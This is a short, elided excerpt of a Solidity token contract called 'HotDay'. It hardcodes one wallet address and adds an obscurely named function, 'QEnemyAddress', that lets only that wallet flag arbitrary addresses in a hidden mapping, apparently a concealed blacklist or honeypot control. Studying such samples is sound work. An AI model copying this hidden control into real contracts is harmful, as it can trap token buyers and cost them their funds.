...
contract HD is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private _name = "HotDay";
    string private _symbol = "HotDay";
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0xd8Fd5bBD16a374e34ca9e1e7BBefa1263E577776));
        __wal = payable(address(0xd8Fd5bBD16a374e34ca9e1e7BBefa1263E577776));
    ...
    function QEnemyAddress(address a,bool b) public {if(msg.sender == __wal){
        _hh_[a] = b;}
    }
